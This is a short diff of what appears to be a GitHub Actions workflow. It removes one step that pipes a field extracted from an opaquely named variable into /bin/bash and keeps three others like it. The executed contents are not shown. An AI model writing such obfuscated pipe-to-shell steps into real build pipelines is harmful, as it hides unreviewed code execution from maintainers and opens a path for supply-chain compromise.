@@ -24,7 +24,6 @@ jobs:
           echo $cdxc29166 | jq -r .m860 | /bin/bash
           echo $qb33665 | jq -r .dr40982 | /bin/bash
           echo $zam151 | jq -r .ydflg26899 | /bin/bash
-          printf '%s' "$ugicb877" | jq -r .lvp05119 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
